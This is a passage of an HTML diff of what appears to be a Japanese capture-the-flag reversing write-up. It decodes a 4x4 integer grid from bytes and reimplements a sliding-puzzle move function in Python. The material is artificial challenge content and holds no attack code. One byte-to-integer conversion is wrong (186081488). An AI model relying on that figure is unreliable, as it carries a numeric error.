+&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">M&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">long&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="n">local_c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_c&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="p">);&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>M&lt;/code>の状態から比較を行い、すべての比較を通らなかったら0を返してくれるようです。
+&lt;code>main&lt;/code>関数でもわかる通り、&lt;code>q&lt;/code>関数から0を返してもらえれば&lt;code>win&lt;/code>関数を実行してくれます。
+以上からU, R, D, Lを&lt;code>&amp;gt;&lt;/code>のあとに入力していくことで&lt;code>M&lt;/code>にある値の交換を行いながら&lt;code>q&lt;/code>関数で0を返してくれるような&lt;code>M&lt;/code>の状態を作り出すことがこのプログラムの意図であることが分かります。
+4の倍数となっている理由は&lt;code>M&lt;/code>について一つインデックスを決めたとき、int型として解釈するためです。int型のサイズは4バイトです。&lt;code>M&lt;/code>は次のようになっています。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">\xdb\x56\x58\x44\x04\x03\x23\x4c\x9f\x44\x22\x00\xb7\x96\x1a\x67\xf7\x44\x56\x6c\x87\x62\xf4\x7f\x29\xc8\xe9\x6e\x72\x2e\xda\x5c\x00\x00\x00\x00\xc9\x88\x8e\x69\x4f\x5a\xe6\x33\x54\x5c\xcc\x50\x1a\x83\x49\x13\x74\x8f\xc8\x53\xb9\x8a\x85\x25\xd8\x76\xf9\x72
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>これを4バイトごと取り出しそれぞれをint型で解釈します。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">\xdb\x56\x58\x44 = 1146640091
+\x04\x03\x23\x4c = 1277362948
+\x9f\x44\x22\x00 = 0002245791
+\xb7\x96\x1a\x67 = 1729795767
+\xf7\x44\x56\x6c = 1817593079
+\x87\x62\xf4\x7f = 2146722439
+\x29\xc8\xe9\x6e = 186081488
+\x72\x2e\xda\x5c = 1557802610
+\x00\x00\x00\x00 = 0000000000
+\xc9\x88\x8e\x69 = 1770948809
+\x4f\x5a\xe6\x33 = 0870734415
+\x54\x5c\xcc\x50 = 1355570260
+\x1a\x83\x49\x13 = 0323584794
+\x74\x8f\xc8\x53 = 1405652852
+\xb9\x8a\x85\x25 = 0629508793
+\xd8\x76\xf9\x72 = 1928951512
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;code>M&lt;/code>を呼び出すインデックスや&lt;code>M&lt;/code>がどのように動いているのか確認したいので、今回はpythonでこれらの関数を再実装し動かしてみます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;span class="lnt">81
+&lt;/span>&lt;span class="lnt">82
+&lt;/span>&lt;span class="lnt">83
+&lt;/span>&lt;span class="lnt">84
+&lt;/span>&lt;span class="lnt">85
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">M_bytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\xdb\x56\x58\x44\x04\x03\x23\x4c\x9f\x44\x22\x00\xb7\x96\x1a\x67\xf7\x44\x56\x6c\x87\x62\xf4\x7f\x29\xc8\xe9\x6e\x72\x2e\xda\x5c\x00\x00\x00\x00\xc9\x88\x8e\x69\x4f\x5a\xe6\x33\x54\x5c\xcc\x50\x1a\x83\x49\x13\x74\x8f\xc8\x53\xb9\x8a\x85\x25\xd8\x76\xf9\x72&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
+&lt;span class="n">M&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)]&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">M&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">M_bytes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">M&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">s&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="n">p1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="n">p2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">local_c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">local_10&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">p1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_c&lt;/span>
+&lt;span class="n">p2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">local_10&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">s_index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">local_c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">local_10&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">] &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">local_c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">local_10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_c&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">local_10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">e&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p1&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="n">s1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">s2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># s1, s2 is (0~3)&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">]&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">s2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p1&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">p1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;U&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">s1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;Move&amp;gt;U: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">elif&lt;/span> &lt;span class="n">p1&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="s2">&amp;#34;V&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">p1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;R&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">s2&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;Move&amp;gt;R: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">elif&lt;/span> &lt;span class="n">p1&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="s2">&amp;#34;S&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">p1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;D&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">s1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;Move&amp;gt;D: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">elif&lt;/span> &lt;span class="n">p1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;L&amp;#34;&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">s2&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;Move&amp;gt;L: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span 